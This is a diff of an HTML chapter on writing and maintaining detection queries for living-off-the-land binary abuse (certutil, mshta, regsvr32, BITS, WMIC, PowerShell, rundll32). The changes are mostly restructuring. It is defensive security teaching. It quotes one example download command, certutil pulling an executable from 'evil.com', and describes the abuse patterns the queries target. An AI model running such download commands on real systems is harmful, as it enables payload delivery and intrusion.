@@ -145,8 +145,43 @@
         <!-- SECTION 1 -->
         <section class="content-section" id="query-foundations">
           <h2>Query Foundations</h2>
-          <p>Effective LOLBin queries share one hard requirement: full CommandLine logging. Without it, you can detect that certutil ran but not whether it ran <code>-hashfile</code> or <code>-urlcache -f http://evil.com/p.exe</code>. CommandLine is what separates benign from malicious. Verify that Sysmon EID 1 is logging CommandLine in your environment -- or that your EDR DeviceProcessEvents table is populated -- before deploying any query in this chapter.</p>
-          <p>Every query in this chapter follows the same structural logic: filter by image or filename, then filter by CommandLine pattern, then add context (parent process, account), then project the fields that matter, then order by timestamp descending.</p>
+          <h3>The One Hard Requirement</h3>
+          <p>Effective LOLBin queries share one hard requirement: full CommandLine logging. Without it, you can detect that certutil ran but not whether it ran <code>-hashfile</code> or <code>-urlcache -f http://evil.com/p.exe</code>. CommandLine is what separates benign from malicious. Verify that Sysmon EID 1 is logging CommandLine in your environment, or that your EDR DeviceProcessEvents table is populated, before deploying any query in this chapter.</p>
+
+          <h3>The Structural Logic Every Query Follows</h3>
+          <div class="process-flow">
+            <div class="flow-step">
+              <span class="flow-step-num">1</span>
+              <div class="flow-step-title">Filter by Image</div>
+              <div class="flow-step-desc">Match on the binary or filename.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">2</span>
+              <div class="flow-step-title">Filter by CommandLine</div>
+              <div class="flow-step-desc">Match the specific abuse pattern in the arguments.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">3</span>
+              <div class="flow-step-title">Add Context</div>
+              <div class="flow-step-desc">Bring in parent process and account.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">4</span>
+              <div class="flow-step-title">Project Fields</div>
+              <div class="flow-step-desc">Keep only the fields that matter for triage.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">5</span>
+              <div class="flow-step-title">Order by Timestamp</div>
+              <div class="flow-step-desc">Sort results descending for review.</div>
+            </div>
+          </div>
+
+          <h3>Query Formats in This Chapter</h3>
           <div class="table-wrap">
             <table>
               <thead>
@@ -160,14 +195,21 @@
               </tbody>
             </table>
           </div>
+          <h3>Starting Broad and Tuning Down</h3>
           <p>All queries start broad. Add suppression conditions incrementally as legitimate patterns are identified in your environment. A query producing zero results either has no matching activity or is over-suppressed. A query with zero false positives after week one is worth auditing -- the most common reason is an overly narrow pattern missing real variants.</p>
         </section>
 
         <!-- SECTION 2 -->
         <section class="content-section" id="certutil-queries">
           <h2>certutil.exe Detection Queries</h2>
-          <p>Three queries covering the three primary certutil abuse scenarios: direct download cradle, network-correlated cradle (highest confidence), and encode/decode obfuscation.</p>
+          <p>Three queries covering the three primary certutil abuse scenarios:</p>
+          <ul>
+            <li><strong>Direct download cradle.</strong> The -urlcache and -decode/-encode flags in CommandLine.</li>
+            <li><strong>Network-correlated cradle.</strong> The highest-confidence variant, joining process creation to the actual network connection.</li>
+            <li><strong>Encode/decode obfuscation.</strong> Base64 payload staging via certutil.</li>
+          </ul>
 
+          <h3>Download Cradle</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -183,6 +225,7 @@ DeviceProcessEvents
 | order by Timestamp desc</code></pre>
           </div>
 
+          <h3>Network-Correlated Cradle (Highest Confidence)</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -203,6 +246,7 @@ certutil_spawn
 | project TimeGenerated, Computer, CommandLine, DestinationHostname, DestinationIp</code></pre>
           </div>
 
+          <h3>Encode/Decode Obfuscation</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">SIGMA</span>
@@ -231,7 +275,7 @@ tags:
   - attack.t1105</code></pre>
           </div>
 
-          <p>Tuning note: add NOT conditions for known-good parents (TrustedInstaller, msiexec during install windows) and known-good destinations (crl.microsoft.com, ocsp.digicert.com, ctldl.windowsupdate.com) before deploying to production alerting. The network correlation query is already scoped to non-Microsoft destinations.</p>
+          <div class="callout-tip"><strong>Tuning note:</strong> add NOT conditions for known-good parents (TrustedInstaller, msiexec during install windows) and known-good destinations (crl.microsoft.com, ocsp.digicert.com, ctldl.windowsupdate.com) before deploying to production alerting. The network correlation query is already scoped to non-Microsoft destinations.</div>
         </section>
 
         <!-- SECTION 3 -->
@@ -239,6 +283,7 @@ tags:
           <h2>mshta.exe and regsvr32.exe Queries</h2>
           <p>mshta queries target URL-based invocation and suspicious child process spawning. regsvr32 queries target the Squiblydoo technique where a remote COM scriptlet is loaded via scrobj.dll.</p>
 
+          <h3>mshta.exe: URL and Child Process Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -280,6 +325,7 @@ tags:
   - attack.t1218.005</code></pre>
           </div>
 
+          <h3>regsvr32.exe: Squiblydoo Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -326,6 +372,7 @@ tags:
           <h2>BITS and WMIC Queries</h2>
           <p>BITS queries cover bitsadmin command-line transfers and the BITS operational event log (EID 59/60), which captures transfers even when process-level telemetry is unavailable. WMIC queries target remote process creation, the primary lateral movement use case.</p>
 
+          <h3>BITS Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">SPL</span>
@@ -355,6 +402,7 @@ Event
 | order by TimeGenerated desc</code></pre>
           </div>
 
+          <h3>WMIC Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -401,6 +449,7 @@ tags:
           <h2>PowerShell LOLScript Queries</h2>
           <p>Four queries targeting the four highest-value PowerShell abuse patterns: encoded commands, download cradles, hidden-window execution, and Office-spawned PowerShell. The Office spawn query requires no CommandLine filtering -- the parent-child relationship alone is sufficient for alerting.</p>
 
+          <h3>Encoded Command Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -415,6 +464,7 @@ DeviceProcessEvents
 | order by Timestamp desc</code></pre>
           </div>
 
+          <h3>Download Cradle Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -435,6 +485,7 @@ DeviceProcessEvents
 | order by Timestamp desc</code></pre>
           </div>
 
+          <h3>Hidden-Window Execution</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">SIGMA</span>
@@ -462,6 +513,7 @@ tags:
   - attack.t1059.001</code></pre>
           </div>
 
+          <h3>Office-Spawned PowerShell</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -488,6 +540,7 @@ DeviceProcessEvents
           <h2>rundll32.exe and installutil.exe Queries</h2>
           <p>rundll32 queries filter by DLL path location rather than binary name, since rundll32 itself runs constantly for legitimate COM operations. installutil queries can afford to be broad -- any execution not loading from System32 or a known installer path warrants review.</p>
 
+          <h3>rundll32.exe Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -525,6 +578,7 @@ tags:
   - attack.t1218.011</code></pre>
           </div>
 
+          <h3>installutil.exe Detection</h3>
           <div class="code-block">
             <div class="code-block-header">
               <span class="code-block-lang">KQL</span>
@@ -544,12 +598,41 @@ DeviceProcessEvents
         <!-- SECTION 7 -->
         <section class="content-section" id="query-library">
           <h2>Building and Maintaining Your Query Library</h2>
+          <h3>Naming and Organization</h3>
           <p>Individual queries become a library when they are organized, tested, and maintained. The naming convention establishes the index: <code>LOLBIN-CERTUTIL-DOWNLOAD-CRADLE</code>, <code>LOLBIN-MSHTA-CHILD-PROCESS</code>. Each name encodes the binary, the technique, and the specific behavior. Sorting by name then groups all certutil rules together, all mshta rules together, and so on.</p>
-          <p>Each query record should carry: the ATT&amp;CK technique tag, the platform it targets, a confidence rating (high / medium / low), the last test date, and a false positive register documenting every suppressed pattern with a business justification. That last item prevents future analysts from removing suppressions that exist for a reason.</p>
+
+          <h3>What Every Query Record Needs</h3>
+          <ul>
+            <li>The ATT&amp;CK technique tag</li>
+            <li>The platform it targets</li>
+            <li>A confidence rating (high / medium / low)</li>
+            <li>The last test date</li>
+            <li>A false positive register documenting every suppressed pattern with a business justification</li>
+          </ul>
+          <p>That last item prevents future analysts from removing suppressions that exist for a reason.</p>
+
+          <h3>Where to Store Your Queries</h3>
           <p>QUERYBASE at <a href="https://h3ad-sec.github.io/QUERYBASE/" target="_blank" rel="noopener">h3ad-sec.github.io/QUERYBASE/</a> stores KQL, Sigma, and XQL queries organized by ATT&amp;CK technique -- the natural home for LOLBin queries built from this chapter. TRACERULES at <a href="https://h3ad-sec.github.io/TRACERULES/" target="_blank" rel="noopener">h3ad-sec.github.io/TRACERULES/</a> provides an ATT&amp;CK-organized detection arsenal including T1218 coverage. Use both as a starting point before authoring net-new rules -- the query may already exist in a tested form.</p>
+
+          <h3>Testing with Atomic Red Team</h3>
           <p>Testing with Atomic Red Team provides controlled ground truth. Run the relevant T1218 test case in an isolated lab, verify the query fires, and document the result in the query record. "Fires on Atomic T1218.001 test 2 as of 2026-06-10" is meaningful. "Tested" with no date and no test case is not.</p>
-          <p>Deployment mode matters for prioritization. Run certutil network correlation and mshta child process queries as real-time alerts with immediate notification. Run broad certutil and wscript execution queries as weekly retrospective hunts with lower thresholds and analyst review rather than automated escalation. The same query syntax can serve both modes -- the difference is schedule and severity.</p>
-          <p>Maintenance cadence: quarterly review of the LOLBAS Project (lolbas-project.github.io) for new entries. Each new entry in the catalog is a detection candidate. Coverage gaps compound over time if the library is not actively extended to match what attackers are actively using.</p>
+
+          <h3>Deployment Mode: Real-Time vs Retrospective</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Mode</th><th>Use Case</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Real-time alert</td><td>Certutil network correlation and mshta child process queries, with immediate notification.</td></tr>
+                <tr><td>Weekly retrospective hunt</td><td>Broad certutil and wscript execution queries, with lower thresholds and analyst review rather than automated escalation.</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p>The same query syntax can serve both modes -- the difference is schedule and severity.</p>
+
+          <h3>Maintenance Cadence</h3>
+          <p>Quarterly review of the LOLBAS Project (lolbas-project.github.io) for new entries. Each new entry in the catalog is a detection candidate. Coverage gaps compound over time if the library is not actively extended to match what attackers are actively using.</p>
           <div class="callout-tip"><strong>Tip:</strong> TRACERULES at h3ad-sec.github.io/TRACERULES/ contains ATT&amp;CK-organized detection queries. Use it as a starting point when building LOLBin coverage for a new platform -- the T1218 section covers most binaries in this chapter in multiple query formats.</div>
         </section>
 
